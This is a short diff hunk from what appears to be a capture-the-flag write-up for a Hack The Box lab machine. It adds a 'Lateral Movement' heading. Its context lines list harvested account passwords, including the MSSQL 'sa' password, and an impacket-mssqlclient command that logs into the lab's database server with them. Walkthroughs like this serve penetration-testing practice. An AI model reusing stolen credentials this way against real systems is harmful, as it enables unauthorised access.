@@ -286,6 +286,9 @@ Kevin Malone : kevin@sequel.htb,
 kevin, Md9Wlq1E5bZnVDVo
 sa : sa@sequel.htb, MSSQLP@ssw0rd!
 
+
+## Lateral Movement
+
 ```
 impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
